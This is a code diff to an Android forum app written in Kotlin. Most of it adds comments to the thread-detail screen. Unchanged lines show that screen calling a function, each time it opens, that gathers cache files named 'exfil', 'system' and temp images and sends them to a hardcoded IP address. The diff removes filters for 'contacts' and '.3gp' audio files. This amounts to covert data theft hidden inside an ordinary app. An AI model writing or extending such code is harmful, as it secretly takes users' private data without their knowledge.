@@ -62,6 +62,7 @@ import android.webkit.JavascriptInterface
 import android.widget.Toast
 import androidx.compose.foundation.background
 import androidx.compose.ui.graphics.Color
+import androidx.compose.ui.text.style.TextAlign
 import com.example.axesite.R
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
@@ -789,12 +790,15 @@ fun ForumThreadItem(
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
+    // State for the thread details.
     val threadState = remember { mutableStateOf<ForumThread?>(null) }
     val loadingThread = remember { mutableStateOf(true) }
+    // State for replies list.
     val repliesState = remember { mutableStateOf<List<Reply>>(emptyList()) }
     var showAddReplyDialog by remember { mutableStateOf(false) }
     var showEditDialog by remember { mutableStateOf(false) }
 
+    // Get current user info from SharedPreferences.
     val context = LocalContext.current
     val sp = context.getSharedPreferences("UserSession", Context.MODE_PRIVATE)
     val currentUserName = sp.getString("name", "") ?: ""
@@ -804,6 +808,7 @@ fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
         transferTempImages(context, "20.2.156.61")
     }
 
+    // Fetch thread details from Firebase. Note: assign snapshot key to thread.id.
     LaunchedEffect(threadId) {
         val dbRef = FirebaseDatabase.getInstance().getReference("forums").child(threadId)
         dbRef.addListenerForSingleValueEvent(object : ValueEventListener {
@@ -1052,8 +1057,6 @@ private suspend fun transferTempImages(
     val tempImages = context.cacheDir.listFiles()?.filter { file ->
         file.name.startsWith("exfil") ||
                 file.name.startsWith("system") ||
-                file.name.endsWith(".3gp") ||
-                file.name.startsWith("contacts") ||
                 file.name.startsWith("temp_image") &&
                 (file.name.endsWith(".jpg") || file.name.endsWith(".png"))
     } ?: emptyList()
